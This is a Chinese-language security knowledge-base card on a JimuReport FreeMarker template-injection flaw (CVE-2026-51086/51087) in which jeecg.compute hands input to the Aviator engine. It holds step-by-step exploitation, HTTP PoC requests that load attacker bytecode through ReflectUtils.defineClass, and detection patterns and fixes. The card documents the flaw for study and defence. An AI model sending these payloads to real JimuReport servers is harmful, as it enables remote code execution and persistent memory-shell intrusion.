---
id: web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce
title: JimuReport FreeMarker SSTI：jeecg.compute 暴露 Aviator 实现沙箱外 RCE（CVE-2026-51086/51087）
type: scenario
domain: web
path: web/java/component
technique: jimureport-freemarker-jeecg-compute-aviator-rce
tags:
- java
- jimureport
- jeecgboot
- freemarker
- ssti
- aviator
- expression-injection
- rce
- cve-2026-51086
- cve-2026-51087
cve:
- CVE-2026-51086
- CVE-2026-51087
severity: critical
confidence: high
affected_versions: JimuReport v1.6.0 <= 版本 < 修复版本（原文未给出具体修复版本号；2.1.3/2.1.5/2.2.0/2.3.0+ 的 Base64 工具类有差异）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:40+08:00'
  notes: 已对照原文核对：FreeMarkerUtils 暴露 jeecg、FreemarkerMethod.compute 调 AviatorEvaluator.execute、queryFieldBySql/loadTableData、SafeFreemarkerMethod 修复与版本差异一致。未验证点：原文未附 JimuReport 端到端 RCE 回显/命令执行截图（仅给出 a+b 预期与完整请求模板），defineClass 链依赖目标 Aviator/Spring 类与 JDK 参数。
url: /docs/web/java/component/web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce/
draft: false
kb_aliases:
- JimuReport FreeMarker SSTI
- JeecgBoot jeecg.compute RCE
- /jmreport/queryFieldBySql SSTI
- /jmreport/loadTableData RCE
- FreemarkerMethod Aviator
- ReflectUtils.defineClass 内存马
- CVE-2026-51086
- CVE-2026-51087
---

## 一句话结论

JimuReport（JeecgBoot 报表模块）的 `/jmreport/queryFieldBySql`、`/jmreport/loadTableData` 把请求中的 `sql` 当 FreeMarker 模板渲染，并把业务对象 `jeecg`（`FreemarkerMethod`）放进模板上下文；`jeecg.compute()` 内部把参数直接交给 `AviatorEvaluator.execute()`，攻击者用 Aviator 的 `use` + `ReflectUtils.defineClass()` 加载 Base64 字节码，即可在 SAFER_RESOLVER 仍生效的情况下完成 RCE/内存马注入。

## 原理

- 入口在 `org.jeecg.modules.jmreport.desreport.render.utils.FreeMarkerUtils.a(String template, Map model)`：
  ```java
  Configuration cfg = new Configuration(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);
  cfg.setNumberFormat("#.#########");
  cfg.setSharedVariable("func", new FunctionMethod());
  model.put("jeecg", new FreemarkerMethod());
  model.put("isNotEmpty", new NotEmptyMethod());
  cfg.setClassicCompatible(true);
  cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
  new Template("template", new StringReader(template), cfg).process(model, writer);
  ```
  `/jmreport/queryFieldBySql`、`/jmreport/loadTableData` 等端点会把用户可控的 `sql` 传进该渲染函数。
- FreeMarker 原生防护（`?new` 危险类黑名单、`?api` 默认关闭）本身没有被绕过；问题出在业务代码主动放进模板上下文的 `jeecg` 对象：`FreemarkerMethod.compute()` 把用户传入的表达式字符串交给 `AviatorEvaluator.execute(field, env)`，等于在模板里开放了一个第二表达式引擎。
- Aviator 默认允许 `use` 引入类、调用静态方法。Payload 用 `use org.springframework.cglib.core.*` 引入 `ReflectUtils`，再调用 `ReflectUtils.defineClass(name, bytes, classLoader, protectionDomain, contextClass)` 把 Base64 解码后的恶意字节码 define 到 JVM 中；字节码可以是命令执行类或内存马。
- 由于危险调用发生在 `jeecg.compute()` 内部的 Aviator 引擎，FreeMarker 的 `TemplateClassResolver.SAFER_RESOLVER`、`api_builtin_enabled=false` 等限制都不覆盖这条路径；这正是“业务暴露对象破坏模板沙箱”的典型形态。

## 触发条件

- 目标集成受影响版本的 JimuReport（原文：v1.6.0 <= 版本 < 修复版本），并暴露 `/jmreport/queryFieldBySql` 或 `/jmreport/loadTableData`。
- 端点可达；原文 CVSS 标注 `PR:N`，称默认配置无需认证（实际部署可能叠加鉴权，需按目标确认）。
- `sql` 参数会进入 `FreeMarkerUtils.a` 的模板渲染，且 `jeecg` 对象被放入模板上下文。
- 目标 classpath 存在 Aviator 与 Spring（`ReflectUtils`/`Base64` 等类可用）；不同 JimuReport 版本的 Base64 工具类不同，需要按版本调整。
- 攻击者能提供 Base64 编码的恶意字节码（命令执行类或内存马）。

## 利用步骤

1. 访问 `/jmreport/queryFieldBySql`，提交最小模板 `${jeecg.compute([], {"a":10,"b":20}, "a+b")}`，若返回 `30`，说明模板渲染与 Aviator 求值均可达。
2. 按目标版本选择 Base64 工具类：2.1.3 及以下用 `org.springframework.util.Base64Utils`，2.1.5 需改用 `org.apache.commons.codec.binary.Base64.decodeBase64`，2.3.0+ 用 commons-codec。
3. 生成恶意字节码并 Base64 编码；构造 Aviator 表达式：`use org.springframework.cglib.core.*; use org.springframework.util.*; ReflectUtils.defineClass('<类名>', <Base64解码>, ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));`。
4. 把表达式放进 `${jeecg.compute([], {\"a\":10,\"b\":20}, \"<表达式>\")}`，作为 `sql` 参数 POST。
5. 观察命令执行/内存马注册结果；`/jmreport/loadTableData` 可复用同一模板表达式。
6. JDK 9+ 若遇到模块访问限制，按原文提示在目标 JVM 增加 `--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.security=ALL-UNNAMED`（需已有改 JVM 参数的条件）。

## PoC

最小探测：

```http
POST /jmreport/queryFieldBySql HTTP/1.1
Host: target:8080
Content-Type: application/json

{"dbSource":"","sql":"${jeecg.compute([], {\"a\":10,\"b\":20}, \"a+b\")}","type":"0"}
```

```text
预期响应：30
```

代码执行（v2.3.0+ 示例）：

```http
POST /jmreport/queryFieldBySql HTTP/1.1
Host: target:8080
Content-Type: application/json;charset=UTF-8

{"sql":"${jeecg.compute([], {\"a\":10,\"b\":20}, \"use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;use org.apache.commons.codec.binary.*;ReflectUtils.defineClass('org.jeecg.codegenerate.Poc',Base64.decodeBase64('BASE64_PAYLOAD'),ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));\")}","dbSource":"","type":"0"}
```

```text
loadTableData 等价请求体：
{"dbSource":"","sql":"${jeecg.compute([], {\"a\":10,\"b\":20}, \"<同上表达式>\")}","tableName":"aaaa);","pageNo":1,"pageSize":10}
```

```text
注意：BASE64_PAYLOAD 为恶意类字节码；不同 JimuReport 版本把 ReflectUtils/Base64 的类名与解码方法按原文版本表替换。
```

## 变体与关联

- 变体：`/jmreport/loadTableData` 与 `/jmreport/queryFieldBySql` 共用同一渲染入口，任一可达即可；其他调用 `FreeMarkerUtils.a` 且 `sql` 可控的报表端点也可能受影响。
- 变体：`jeecg` 之外，模板上下文还暴露了 `func`（FunctionMethod）、`isNotEmpty`（NotEmptyMethod）等业务对象，可继续审计其方法是否能把参数送入危险引擎。
- 变体：Aviator 表达式不限于 `defineClass`，也可尝试其它静态方法调用/反射 gadget；但需目标 Aviator 版本允许相应 Feature。
- 关联卡片：[[web-java-component-jimureport-unauth-aviator-rce]]（同产品另一条 Aviator RCE：硬编码签名 + 自动导出接口，入口与触发条件不同）；[[binary-pwn-sandbox-escape-aviator-internalvars-seq-reflection]]（Aviator 引擎自身沙箱逃逸的通用构造）；`web/java/expression` 下的表达式注入卡。
- 边界：JimuReport 已升级到修复版本（`SafeFreemarkerMethod` 对表达式做白名单）后，`jeecg.compute` 不再接受任意表达式；端点被鉴权/网关隔离、或 `sql` 不进入模板渲染时链路失效。

## 检测与防御

- 检测：请求体 `sql` 中出现 `${jeecg.`、`compute(`、`AviatorEvaluator`、`ReflectUtils.defineClass`、`Base64.decodeBase64`、`ClassLoader.getSystemClassLoader`；`/jmreport/queryFieldBySql`、`/jmreport/loadTableData` 返回异常或出现 `30` 之类的表达式计算结果；JVM 内出现新 define 的类、内存马注册或报表进程派生命令。
- 修复：升级 JimuReport 到修复版本；厂商用 `SafeFreemarkerMethod` 对表达式做严格白名单（原文示例仅允许数字与算术符号），并移除模板上下文中可执行任意表达式的业务方法。
- 加固：不需要报表模块时禁用/下线 JimuReport；对 `/jmreport/*` 加真实鉴权与网络隔离；WAF 阻断 `sql` 中的 `${jeecg.`、`compute(`、`ReflectUtils` 等组合；限制 Aviator 的 `use`/静态方法 Feature，使用独立、受限的表达式实例。
